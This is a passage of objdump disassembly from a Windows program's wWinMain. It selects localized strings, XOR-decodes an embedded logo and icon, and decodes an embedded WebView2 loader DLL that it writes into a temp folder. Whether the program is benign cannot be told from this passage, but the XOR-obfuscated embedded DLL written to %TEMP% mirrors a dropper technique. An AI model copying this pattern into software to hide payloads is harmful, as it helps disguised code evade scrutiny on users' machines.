   140001670:	0f 84 a2 01 00 00    	je     140001818 <wWinMain+0x438>
   140001676:	48 8d 15 ed 59 01 00 	lea    0x159ed(%rip),%rdx        # 14001706a <enc_ico_data+0x98ba>
   14000167d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001682:	e8 29 3f 00 00       	call   1400055b0 <wcscmp>
   140001687:	85 c0                	test   %eax,%eax
   140001689:	0f 84 a3 01 00 00    	je     140001832 <wWinMain+0x452>
   14000168f:	48 8d 15 7e 5a 01 00 	lea    0x15a7e(%rip),%rdx        # 140017114 <enc_ico_data+0x9964>
   140001696:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000169b:	e8 10 3f 00 00       	call   1400055b0 <wcscmp>
   1400016a0:	85 c0                	test   %eax,%eax
   1400016a2:	0f 84 a4 01 00 00    	je     14000184c <wWinMain+0x46c>
   1400016a8:	48 8d 15 a7 5a 01 00 	lea    0x15aa7(%rip),%rdx        # 140017156 <enc_ico_data+0x99a6>
   1400016af:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400016b4:	e8 f7 3e 00 00       	call   1400055b0 <wcscmp>
   1400016b9:	85 c0                	test   %eax,%eax
   1400016bb:	0f 84 a5 01 00 00    	je     140001866 <wWinMain+0x486>
   1400016c1:	48 8d 15 ec 5a 01 00 	lea    0x15aec(%rip),%rdx        # 1400171b4 <enc_ico_data+0x9a04>
   1400016c8:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400016cd:	e8 de 3e 00 00       	call   1400055b0 <wcscmp>
   1400016d2:	85 c0                	test   %eax,%eax
   1400016d4:	0f 84 a6 01 00 00    	je     140001880 <wWinMain+0x4a0>
   1400016da:	48 8d 15 33 5b 01 00 	lea    0x15b33(%rip),%rdx        # 140017214 <enc_ico_data+0x9a64>
   1400016e1:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400016e6:	e8 c5 3e 00 00       	call   1400055b0 <wcscmp>
   1400016eb:	85 c0                	test   %eax,%eax
   1400016ed:	0f 84 a7 01 00 00    	je     14000189a <wWinMain+0x4ba>
   1400016f3:	48 8d 15 de 5b 01 00 	lea    0x15bde(%rip),%rdx        # 1400172d8 <enc_ico_data+0x9b28>
   1400016fa:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400016ff:	e8 ac 3e 00 00       	call   1400055b0 <wcscmp>
   140001704:	85 c0                	test   %eax,%eax
   140001706:	0f 84 a8 01 00 00    	je     1400018b4 <wWinMain+0x4d4>
   14000170c:	48 8d 15 7d 5c 01 00 	lea    0x15c7d(%rip),%rdx        # 140017390 <enc_ico_data+0x9be0>
   140001713:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001718:	e8 93 3e 00 00       	call   1400055b0 <wcscmp>
   14000171d:	85 c0                	test   %eax,%eax
   14000171f:	0f 84 a9 01 00 00    	je     1400018ce <wWinMain+0x4ee>
   140001725:	48 8d 15 2c 5d 01 00 	lea    0x15d2c(%rip),%rdx        # 140017458 <enc_ico_data+0x9ca8>
   14000172c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001731:	e8 7a 3e 00 00       	call   1400055b0 <wcscmp>
   140001736:	85 c0                	test   %eax,%eax
   140001738:	0f 84 a7 01 00 00    	je     1400018e5 <wWinMain+0x505>
   14000173e:	48 8d 15 b7 5d 01 00 	lea    0x15db7(%rip),%rdx        # 1400174fc <enc_ico_data+0x9d4c>
   140001745:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000174a:	e8 61 3e 00 00       	call   1400055b0 <wcscmp>
   14000174f:	85 c0                	test   %eax,%eax
   140001751:	0f 84 a5 01 00 00    	je     1400018fc <wWinMain+0x51c>
   140001757:	48 8d 15 30 5e 01 00 	lea    0x15e30(%rip),%rdx        # 14001758e <enc_ico_data+0x9dde>
   14000175e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001763:	e8 48 3e 00 00       	call   1400055b0 <wcscmp>
   140001768:	85 c0                	test   %eax,%eax
   14000176a:	0f 84 a3 01 00 00    	je     140001913 <wWinMain+0x533>
   140001770:	48 8d 15 c7 5e 01 00 	lea    0x15ec7(%rip),%rdx        # 14001763e <enc_ico_data+0x9e8e>
   140001777:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000177c:	e8 2f 3e 00 00       	call   1400055b0 <wcscmp>
   140001781:	85 c0                	test   %eax,%eax
   140001783:	0f 84 a1 01 00 00    	je     14000192a <wWinMain+0x54a>
   140001789:	48 8d 15 52 5f 01 00 	lea    0x15f52(%rip),%rdx        # 1400176e2 <enc_ico_data+0x9f32>
   140001790:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001795:	e8 16 3e 00 00       	call   1400055b0 <wcscmp>
   14000179a:	85 c0                	test   %eax,%eax
   14000179c:	0f 84 9f 01 00 00    	je     140001941 <wWinMain+0x561>
   1400017a2:	48 8d 15 cf 5f 01 00 	lea    0x15fcf(%rip),%rdx        # 140017778 <enc_ico_data+0x9fc8>
   1400017a9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400017ae:	e8 fd 3d 00 00       	call   1400055b0 <wcscmp>
   1400017b3:	85 c0                	test   %eax,%eax
   1400017b5:	48 8d 05 c2 5f 01 00 	lea    0x15fc2(%rip),%rax        # 14001777e <enc_ico_data+0x9fce>
   1400017bc:	48 8d 15 5b 57 01 00 	lea    0x1575b(%rip),%rdx        # 140016f1e <enc_ico_data+0x976e>
   1400017c3:	48 0f 44 d0          	cmove  %rax,%rdx
   1400017c7:	48 8d 05 e2 5f 01 00 	lea    0x15fe2(%rip),%rax        # 1400177b0 <enc_ico_data+0xa000>
   1400017ce:	48 8d 0d 81 57 01 00 	lea    0x15781(%rip),%rcx        # 140016f56 <enc_ico_data+0x97a6>
   1400017d5:	48 0f 44 c8          	cmove  %rax,%rcx
   1400017d9:	4c 8d 05 1a 60 01 00 	lea    0x1601a(%rip),%r8        # 1400177fa <enc_ico_data+0xa04a>
   1400017e0:	48 8d 05 cb 57 01 00 	lea    0x157cb(%rip),%rax        # 140016fb2 <enc_ico_data+0x9802>
   1400017e7:	49 0f 44 c0          	cmove  %r8,%rax
   1400017eb:	e9 66 01 00 00       	jmp    140001956 <wWinMain+0x576>
   1400017f0:	48 8d 05 27 57 01 00 	lea    0x15727(%rip),%rax        # 140016f1e <enc_ico_data+0x976e>
   1400017f7:	48 89 05 4a 89 07 00 	mov    %rax,0x7894a(%rip)        # 14007a148 <g_lang.0>
   1400017fe:	48 8d 05 51 57 01 00 	lea    0x15751(%rip),%rax        # 140016f56 <enc_ico_data+0x97a6>
   140001805:	48 89 05 44 89 07 00 	mov    %rax,0x78944(%rip)        # 14007a150 <g_lang.1>
   14000180c:	48 8d 05 9f 57 01 00 	lea    0x1579f(%rip),%rax        # 140016fb2 <enc_ico_data+0x9802>
   140001813:	e9 4c 01 00 00       	jmp    140001964 <wWinMain+0x584>
   140001818:	48 8d 05 3f 58 01 00 	lea    0x1583f(%rip),%rax        # 14001705e <enc_ico_data+0x98ae>
   14000181f:	48 8d 0d e0 57 01 00 	lea    0x157e0(%rip),%rcx        # 140017006 <enc_ico_data+0x9856>
   140001826:	48 8d 15 97 57 01 00 	lea    0x15797(%rip),%rdx        # 140016fc4 <enc_ico_data+0x9814>
   14000182d:	e9 24 01 00 00       	jmp    140001956 <wWinMain+0x576>
   140001832:	48 8d 05 cd 58 01 00 	lea    0x158cd(%rip),%rax        # 140017106 <enc_ico_data+0x9956>
   140001839:	48 8d 0d 6c 58 01 00 	lea    0x1586c(%rip),%rcx        # 1400170ac <enc_ico_data+0x98fc>
   140001840:	48 8d 15 29 58 01 00 	lea    0x15829(%rip),%rdx        # 140017070 <enc_ico_data+0x98c0>
   140001847:	e9 0a 01 00 00       	jmp    140001956 <wWinMain+0x576>
   14000184c:	48 8d 05 fd 58 01 00 	lea    0x158fd(%rip),%rax        # 140017150 <enc_ico_data+0x99a0>
   140001853:	48 8d 0d d8 58 01 00 	lea    0x158d8(%rip),%rcx        # 140017132 <enc_ico_data+0x9982>
   14000185a:	48 8d 15 b9 58 01 00 	lea    0x158b9(%rip),%rdx        # 14001711a <enc_ico_data+0x996a>
   140001861:	e9 f0 00 00 00       	jmp    140001956 <wWinMain+0x576>
   140001866:	48 8d 05 3d 59 01 00 	lea    0x1593d(%rip),%rax        # 1400171aa <enc_ico_data+0x99fa>
   14000186d:	48 8d 0d 06 59 01 00 	lea    0x15906(%rip),%rcx        # 14001717a <enc_ico_data+0x99ca>
   140001874:	48 8d 15 e1 58 01 00 	lea    0x158e1(%rip),%rdx        # 14001715c <enc_ico_data+0x99ac>
   14000187b:	e9 d6 00 00 00       	jmp    140001956 <wWinMain+0x576>
   140001880:	48 8d 05 85 59 01 00 	lea    0x15985(%rip),%rax        # 14001720c <enc_ico_data+0x9a5c>
   140001887:	48 8d 0d 52 59 01 00 	lea    0x15952(%rip),%rcx        # 1400171e0 <enc_ico_data+0x9a30>
   14000188e:	48 8d 15 25 59 01 00 	lea    0x15925(%rip),%rdx        # 1400171ba <enc_ico_data+0x9a0a>
   140001895:	e9 bc 00 00 00       	jmp    140001956 <wWinMain+0x576>
   14000189a:	48 8d 05 19 5a 01 00 	lea    0x15a19(%rip),%rax        # 1400172ba <enc_ico_data+0x9b0a>
   1400018a1:	48 8d 0d a0 59 01 00 	lea    0x159a0(%rip),%rcx        # 140017248 <enc_ico_data+0x9a98>
   1400018a8:	48 8d 15 6b 59 01 00 	lea    0x1596b(%rip),%rdx        # 14001721a <enc_ico_data+0x9a6a>
   1400018af:	e9 a2 00 00 00       	jmp    140001956 <wWinMain+0x576>
   1400018b4:	48 8d 05 c3 5a 01 00 	lea    0x15ac3(%rip),%rax        # 14001737e <enc_ico_data+0x9bce>
   1400018bb:	48 8d 0d 5a 5a 01 00 	lea    0x15a5a(%rip),%rcx        # 14001731c <enc_ico_data+0x9b6c>
   1400018c2:	48 8d 15 15 5a 01 00 	lea    0x15a15(%rip),%rdx        # 1400172de <enc_ico_data+0x9b2e>
   1400018c9:	e9 88 00 00 00       	jmp    140001956 <wWinMain+0x576>
   1400018ce:	48 8d 05 6f 5b 01 00 	lea    0x15b6f(%rip),%rax        # 140017444 <enc_ico_data+0x9c94>
   1400018d5:	48 8d 0d fe 5a 01 00 	lea    0x15afe(%rip),%rcx        # 1400173da <enc_ico_data+0x9c2a>
   1400018dc:	48 8d 15 b3 5a 01 00 	lea    0x15ab3(%rip),%rdx        # 140017396 <enc_ico_data+0x9be6>
   1400018e3:	eb 71                	jmp    140001956 <wWinMain+0x576>
   1400018e5:	48 8d 05 02 5c 01 00 	lea    0x15c02(%rip),%rax        # 1400174ee <enc_ico_data+0x9d3e>
   1400018ec:	48 8d 0d a9 5b 01 00 	lea    0x15ba9(%rip),%rcx        # 14001749c <enc_ico_data+0x9cec>
   1400018f3:	48 8d 15 64 5b 01 00 	lea    0x15b64(%rip),%rdx        # 14001745e <enc_ico_data+0x9cae>
   1400018fa:	eb 5a                	jmp    140001956 <wWinMain+0x576>
   1400018fc:	48 8d 05 7d 5c 01 00 	lea    0x15c7d(%rip),%rax        # 140017580 <enc_ico_data+0x9dd0>
   140001903:	48 8d 0d 24 5c 01 00 	lea    0x15c24(%rip),%rcx        # 14001752e <enc_ico_data+0x9d7e>
   14000190a:	48 8d 15 f1 5b 01 00 	lea    0x15bf1(%rip),%rdx        # 140017502 <enc_ico_data+0x9d52>
   140001911:	eb 43                	jmp    140001956 <wWinMain+0x576>
   140001913:	48 8d 05 10 5d 01 00 	lea    0x15d10(%rip),%rax        # 14001762a <enc_ico_data+0x9e7a>
   14000191a:	48 8d 0d b1 5c 01 00 	lea    0x15cb1(%rip),%rcx        # 1400175d2 <enc_ico_data+0x9e22>
   140001921:	48 8d 15 6c 5c 01 00 	lea    0x15c6c(%rip),%rdx        # 140017594 <enc_ico_data+0x9de4>
   140001928:	eb 2c                	jmp    140001956 <wWinMain+0x576>
   14000192a:	48 8d 05 99 5d 01 00 	lea    0x15d99(%rip),%rax        # 1400176ca <enc_ico_data+0x9f1a>
   140001931:	48 8d 0d 3a 5d 01 00 	lea    0x15d3a(%rip),%rcx        # 140017672 <enc_ico_data+0x9ec2>
   140001938:	48 8d 15 05 5d 01 00 	lea    0x15d05(%rip),%rdx        # 140017644 <enc_ico_data+0x9e94>
   14000193f:	eb 15                	jmp    140001956 <wWinMain+0x576>
   140001941:	48 8d 05 1e 5e 01 00 	lea    0x15e1e(%rip),%rax        # 140017766 <enc_ico_data+0x9fb6>
   140001948:	48 8d 0d d1 5d 01 00 	lea    0x15dd1(%rip),%rcx        # 140017720 <enc_ico_data+0x9f70>
   14000194f:	48 8d 15 92 5d 01 00 	lea    0x15d92(%rip),%rdx        # 1400176e8 <enc_ico_data+0x9f38>
   140001956:	48 89 15 eb 87 07 00 	mov    %rdx,0x787eb(%rip)        # 14007a148 <g_lang.0>
   14000195d:	48 89 0d ec 87 07 00 	mov    %rcx,0x787ec(%rip)        # 14007a150 <g_lang.1>
   140001964:	48 89 05 ed 87 07 00 	mov    %rax,0x787ed(%rip)        # 14007a158 <g_lang.2>
   14000196b:	48 89 35 36 87 07 00 	mov    %rsi,0x78736(%rip)        # 14007a0a8 <g>
   140001972:	ff 15 80 60 07 00    	call   *0x76080(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001978:	41 b8 e8 75 00 00    	mov    $0x75e8,%r8d
   14000197e:	48 89 c1             	mov    %rax,%rcx
   140001981:	31 d2                	xor    %edx,%edx
   140001983:	ff 15 97 60 07 00    	call   *0x76097(%rip)        # 140077a20 <__imp_HeapAlloc>
   140001989:	48 85 c0             	test   %rax,%rax
   14000198c:	0f 84 fd 00 00 00    	je     140001a8f <wWinMain+0x6af>
   140001992:	48 89 c7             	mov    %rax,%rdi
   140001995:	48 8d 15 24 48 00 00 	lea    0x4824(%rip),%rdx        # 1400061c0 <enc_logo_bgra>
   14000199c:	41 b8 e8 75 00 00    	mov    $0x75e8,%r8d
   1400019a2:	48 89 c1             	mov    %rax,%rcx
   1400019a5:	e8 f6 3b 00 00       	call   1400055a0 <memcpy>
   1400019aa:	b8 01 00 00 00       	mov    $0x1,%eax
   1400019af:	48 8d 0d 5a 5e 01 00 	lea    0x15e5a(%rip),%rcx        # 140017810 <XOR_KEY>
   1400019b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400019bd:	00 00 00 
   1400019c0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400019c3:	83 e2 0e             	and    $0xe,%edx
   1400019c6:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   1400019ca:	30 54 07 ff          	xor    %dl,-0x1(%rdi,%rax,1)
   1400019ce:	89 c2                	mov    %eax,%edx
   1400019d0:	83 e2 0f             	and    $0xf,%edx
   1400019d3:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   1400019d7:	30 14 07             	xor    %dl,(%rdi,%rax,1)
   1400019da:	48 83 c0 02          	add    $0x2,%rax
   1400019de:	48 3d e9 75 00 00    	cmp    $0x75e9,%rax
   1400019e4:	75 da                	jne    1400019c0 <wWinMain+0x5e0>
   1400019e6:	48 b8 9a 00 00 00 31 	movabs $0x310000009a,%rax
   1400019ed:	00 00 00 
   1400019f0:	48 89 05 d1 86 07 00 	mov    %rax,0x786d1(%rip)        # 14007a0c8 <g+0x20>
   1400019f7:	0f 28 05 d2 46 00 00 	movaps 0x46d2(%rip),%xmm0        # 1400060d0 <.refptr._newmode+0x40>
   1400019fe:	0f 11 84 24 80 02 00 	movups %xmm0,0x280(%rsp)
   140001a05:	00 
   140001a06:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001a09:	0f 11 84 24 90 02 00 	movups %xmm0,0x290(%rsp)
   140001a10:	00 
   140001a11:	0f 11 84 24 9c 02 00 	movups %xmm0,0x29c(%rsp)
   140001a18:	00 
   140001a19:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140001a20:	00 00 
   140001a22:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001a29:	00 
   140001a2a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001a31:	00 00 
   140001a33:	48 8d 94 24 80 02 00 	lea    0x280(%rsp),%rdx
   140001a3a:	00 
   140001a3b:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140001a40:	31 c9                	xor    %ecx,%ecx
   140001a42:	45 31 c0             	xor    %r8d,%r8d
   140001a45:	ff 15 95 61 07 00    	call   *0x76195(%rip)        # 140077be0 <__imp_CreateDIBSection>
   140001a4b:	48 89 c3             	mov    %rax,%rbx
   140001a4e:	48 85 c0             	test   %rax,%rax
   140001a51:	0f 95 c0             	setne  %al
   140001a54:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001a59:	48 85 c9             	test   %rcx,%rcx
   140001a5c:	0f 95 c2             	setne  %dl
   140001a5f:	20 c2                	and    %al,%dl
   140001a61:	80 fa 01             	cmp    $0x1,%dl
   140001a64:	75 0e                	jne    140001a74 <wWinMain+0x694>
   140001a66:	41 b8 e8 75 00 00    	mov    $0x75e8,%r8d
   140001a6c:	48 89 fa             	mov    %rdi,%rdx
   140001a6f:	e8 2c 3b 00 00       	call   1400055a0 <memcpy>
   140001a74:	48 89 1d 35 86 07 00 	mov    %rbx,0x78635(%rip)        # 14007a0b0 <g+0x8>
   140001a7b:	ff 15 77 5f 07 00    	call   *0x75f77(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001a81:	48 89 c1             	mov    %rax,%rcx
   140001a84:	31 d2                	xor    %edx,%edx
   140001a86:	49 89 f8             	mov    %rdi,%r8
   140001a89:	ff 15 99 5f 07 00    	call   *0x75f99(%rip)        # 140077a28 <__imp_HeapFree>
   140001a8f:	4c 8b 35 72 60 07 00 	mov    0x76072(%rip),%r14        # 140077b08 <__imp_GetSystemMetrics>
   140001a96:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001a9b:	41 ff d6             	call   *%r14
   140001a9e:	89 c7                	mov    %eax,%edi
   140001aa0:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140001aa5:	41 ff d6             	call   *%r14
   140001aa8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140001aac:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001ab3:	00 
   140001ab4:	48 8b 1d 7d 60 07 00 	mov    0x7607d(%rip),%rbx        # 140077b38 <__imp_LoadImageW>
   140001abb:	ba 01 00 00 00       	mov    $0x1,%edx
   140001ac0:	48 89 f1             	mov    %rsi,%rcx
   140001ac3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001ac9:	41 89 f9             	mov    %edi,%r9d
   140001acc:	ff d3                	call   *%rbx
   140001ace:	48 89 05 e3 85 07 00 	mov    %rax,0x785e3(%rip)        # 14007a0b8 <g+0x10>
   140001ad5:	b9 31 00 00 00       	mov    $0x31,%ecx
   140001ada:	41 ff d6             	call   *%r14
   140001add:	89 c7                	mov    %eax,%edi
   140001adf:	b9 32 00 00 00       	mov    $0x32,%ecx
   140001ae4:	41 ff d6             	call   *%r14
   140001ae7:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140001aeb:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001af2:	00 
   140001af3:	ba 01 00 00 00       	mov    $0x1,%edx
   140001af8:	48 89 f1             	mov    %rsi,%rcx
   140001afb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001b01:	41 89 f9             	mov    %edi,%r9d
   140001b04:	ff d3                	call   *%rbx
   140001b06:	48 89 05 b3 85 07 00 	mov    %rax,0x785b3(%rip)        # 14007a0c0 <g+0x18>
   140001b0d:	48 83 3d a3 85 07 00 	cmpq   $0x0,0x785a3(%rip)        # 14007a0b8 <g+0x10>
   140001b14:	00 
   140001b15:	0f 95 c1             	setne  %cl
   140001b18:	48 85 c0             	test   %rax,%rax
   140001b1b:	0f 95 c0             	setne  %al
   140001b1e:	84 c1                	test   %al,%cl
   140001b20:	0f 85 a0 00 00 00    	jne    140001bc6 <wWinMain+0x7e6>
   140001b26:	ff 15 cc 5e 07 00    	call   *0x75ecc(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001b2c:	41 b8 9a 96 00 00    	mov    $0x969a,%r8d
   140001b32:	48 89 c1             	mov    %rax,%rcx
   140001b35:	31 d2                	xor    %edx,%edx
   140001b37:	ff 15 e3 5e 07 00    	call   *0x75ee3(%rip)        # 140077a20 <__imp_HeapAlloc>
   140001b3d:	48 85 c0             	test   %rax,%rax
   140001b40:	0f 84 80 00 00 00    	je     140001bc6 <wWinMain+0x7e6>
   140001b46:	48 89 c7             	mov    %rax,%rdi
   140001b49:	48 8d 15 60 bc 00 00 	lea    0xbc60(%rip),%rdx        # 14000d7b0 <enc_ico_data>
   140001b50:	41 b8 9a 96 00 00    	mov    $0x969a,%r8d
   140001b56:	48 89 c1             	mov    %rax,%rcx
   140001b59:	e8 42 3a 00 00       	call   1400055a0 <memcpy>
   140001b5e:	b8 01 00 00 00       	mov    $0x1,%eax
   140001b63:	48 8d 0d a6 5c 01 00 	lea    0x15ca6(%rip),%rcx        # 140017810 <XOR_KEY>
   140001b6a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001b70:	8d 50 ff             	lea    -0x1(%rax),%edx
   140001b73:	83 e2 0e             	and    $0xe,%edx
   140001b76:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001b7a:	30 54 07 ff          	xor    %dl,-0x1(%rdi,%rax,1)
   140001b7e:	89 c2                	mov    %eax,%edx
   140001b80:	83 e2 0f             	and    $0xf,%edx
   140001b83:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001b87:	30 14 07             	xor    %dl,(%rdi,%rax,1)
   140001b8a:	48 83 c0 02          	add    $0x2,%rax
   140001b8e:	48 3d 9b 96 00 00    	cmp    $0x969b,%rax
   140001b94:	75 da                	jne    140001b70 <wWinMain+0x790>
   140001b96:	48 83 3d 1a 85 07 00 	cmpq   $0x0,0x7851a(%rip)        # 14007a0b8 <g+0x10>
   140001b9d:	00 
   140001b9e:	0f 84 42 05 00 00    	je     1400020e6 <wWinMain+0xd06>
   140001ba4:	48 83 3d 14 85 07 00 	cmpq   $0x0,0x78514(%rip)        # 14007a0c0 <g+0x18>
   140001bab:	00 
   140001bac:	0f 84 5e 05 00 00    	je     140002110 <wWinMain+0xd30>
   140001bb2:	ff 15 40 5e 07 00    	call   *0x75e40(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001bb8:	48 89 c1             	mov    %rax,%rcx
   140001bbb:	31 d2                	xor    %edx,%edx
   140001bbd:	49 89 f8             	mov    %rdi,%r8
   140001bc0:	ff 15 62 5e 07 00    	call   *0x75e62(%rip)        # 140077a28 <__imp_HeapFree>
   140001bc6:	48 8d bc 24 80 02 00 	lea    0x280(%rsp),%rdi
   140001bcd:	00 
   140001bce:	b9 04 01 00 00       	mov    $0x104,%ecx
   140001bd3:	48 89 fa             	mov    %rdi,%rdx
   140001bd6:	ff 15 34 5e 07 00    	call   *0x75e34(%rip)        # 140077a10 <__imp_GetTempPathW>
   140001bdc:	48 8d 15 5d 5c 01 00 	lea    0x15c5d(%rip),%rdx        # 140017840 <XOR_KEY+0x30>
   140001be3:	4c 8b 3d ce 5f 07 00 	mov    0x75fce(%rip),%r15        # 140077bb8 <__imp_wsprintfW>
   140001bea:	48 8d 5c 24 70       	lea    0x70(%rsp),%rbx
   140001bef:	48 89 d9             	mov    %rbx,%rcx
   140001bf2:	49 89 f8             	mov    %rdi,%r8
   140001bf5:	41 ff d7             	call   *%r15
   140001bf8:	48 89 d9             	mov    %rbx,%rcx
   140001bfb:	31 d2                	xor    %edx,%edx
   140001bfd:	ff 15 85 5d 07 00    	call   *0x75d85(%rip)        # 140077988 <__imp_CreateDirectoryW>
   140001c03:	48 8d 3d 8e 85 07 00 	lea    0x7858e(%rip),%rdi        # 14007a198 <g_wv+0x38>
   140001c0a:	48 8d 15 45 5c 01 00 	lea    0x15c45(%rip),%rdx        # 140017856 <XOR_KEY+0x46>
   140001c11:	48 89 f9             	mov    %rdi,%rcx
   140001c14:	49 89 d8             	mov    %rbx,%r8
   140001c17:	41 ff d7             	call   *%r15
   140001c1a:	48 89 f9             	mov    %rdi,%rcx
   140001c1d:	ff 15 b5 5d 07 00    	call   *0x75db5(%rip)        # 1400779d8 <__imp_GetFileAttributesW>
   140001c23:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001c26:	74 33                	je     140001c5b <wWinMain+0x87b>
   140001c28:	48 8d 0d 69 85 07 00 	lea    0x78569(%rip),%rcx        # 14007a198 <g_wv+0x38>
   140001c2f:	4c 8d 84 24 90 04 00 	lea    0x490(%rsp),%r8
   140001c36:	00 
   140001c37:	31 d2                	xor    %edx,%edx
   140001c39:	ff 15 91 5d 07 00    	call   *0x75d91(%rip)        # 1400779d0 <__imp_GetFileAttributesExW>
   140001c3f:	85 c0                	test   %eax,%eax
   140001c41:	0f 84 04 01 00 00    	je     140001d4b <wWinMain+0x96b>
   140001c47:	8b 84 24 ac 04 00 00 	mov    0x4ac(%rsp),%eax
   140001c4e:	0b 84 24 b0 04 00 00 	or     0x4b0(%rsp),%eax
   140001c55:	0f 85 f0 00 00 00    	jne    140001d4b <wWinMain+0x96b>
   140001c5b:	ff 15 97 5d 07 00    	call   *0x75d97(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001c61:	41 b8 68 70 02 00    	mov    $0x27068,%r8d
   140001c67:	48 89 c1             	mov    %rax,%rcx
   140001c6a:	31 d2                	xor    %edx,%edx
   140001c6c:	ff 15 ae 5d 07 00    	call   *0x75dae(%rip)        # 140077a20 <__imp_HeapAlloc>
   140001c72:	48 85 c0             	test   %rax,%rax
   140001c75:	0f 84 d0 00 00 00    	je     140001d4b <wWinMain+0x96b>
   140001c7b:	48 89 c7             	mov    %rax,%rdi
   140001c7e:	48 8d 15 0b 5c 01 00 	lea    0x15c0b(%rip),%rdx        # 140017890 <enc_webview2_loader>
   140001c85:	41 b8 68 70 02 00    	mov    $0x27068,%r8d
   140001c8b:	48 89 c1             	mov    %rax,%rcx
   140001c8e:	e8 0d 39 00 00       	call   1400055a0 <memcpy>
   140001c93:	b8 01 00 00 00       	mov    $0x1,%eax
   140001c98:	48 8d 0d 71 5b 01 00 	lea    0x15b71(%rip),%rcx        # 140017810 <XOR_KEY>
   140001c9f:	90                   	nop
   140001ca0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140001ca3:	83 e2 0e             	and    $0xe,%edx
   140001ca6:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001caa:	30 54 07 ff          	xor    %dl,-0x1(%rdi,%rax,1)
   140001cae:	89 c2                	mov    %eax,%edx
   140001cb0:	83 e2 0f             	and    $0xf,%edx
   140001cb3:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001cb7:	30 14 07             	xor    %dl,(%rdi,%rax,1)
   140001cba:	48 83 c0 02          	add    $0x2,%rax
   140001cbe:	48 3d 69 70 02 00    	cmp    $0x27069,%rax
   140001cc4:	75 da                	jne    140001ca0 <wWinMain+0x8c0>
   140001cc6:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001ccd:	00 00 
   140001ccf:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001cd6:	00 
   140001cd7:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140001cde:	00 
   140001cdf:	48 8d 0d b2 84 07 00 	lea    0x784b2(%rip),%rcx        # 14007a198 <g_wv+0x38>
   140001ce6:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140001ceb:	45 31 c0             	xor    %r8d,%r8d
   140001cee:	45 31 c9             	xor    %r9d,%r9d
   140001cf1:	ff 15 99 5c 07 00    	call   *0x75c99(%rip)        # 140077990 <__imp_CreateFileW>
   140001cf7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001cfb:	74 3a                	je     140001d37 <wWinMain+0x957>
   140001cfd:	48 89 c3             	mov    %rax,%rbx
   140001d00:	c7 84 24 90 04 00 00 	movl   $0x0,0x490(%rsp)
   140001d07:	00 00 00 00 
   140001d0b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001d12:	00 00 
   140001d14:	4c 8d 8c 24 90 04 00 	lea    0x490(%rsp),%r9
   140001d1b:	00 
   140001d1c:	48 89 c1             	mov    %rax,%rcx
   140001d1f:	48 89 fa             	mov    %rdi,%rdx
   140001d22:	41 b8 68 70 02 00    	mov    $0x27068,%r8d
   140001d28:	ff 15 52 5d 07 00    	call   *0x75d52(%rip)        # 140077a80 <__imp_WriteFile>
   140001d2e:	48 89 d9             	mov    %rbx,%rcx
   140001d31:	ff 15 49 5c 07 00    	call   *0x75c49(%rip)        # 140077980 <__imp_CloseHandle>
   140001d37:	ff 15 bb 5c 07 00    	call   *0x75cbb(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001d3d:	48 89 c1             	mov    %rax,%rcx
   140001d40:	31 d2                	xor    %edx,%edx
   140001d42:	49 89 f8             	mov    %rdi,%r8
   140001d45:	ff 15 dd 5c 07 00    	call   *0x75cdd(%rip)        # 140077a28 <__imp_HeapFree>
   140001d4b:	48 8d 3d 4e 86 07 00 	lea    0x7864e(%rip),%rdi        # 14007a3a0 <g_wv+0x240>
   140001d52:	48 8d 15 9f cb 03 00 	lea    0x3cb9f(%rip),%rdx        # 14003e8f8 <enc_webview2_loader+0x27068>
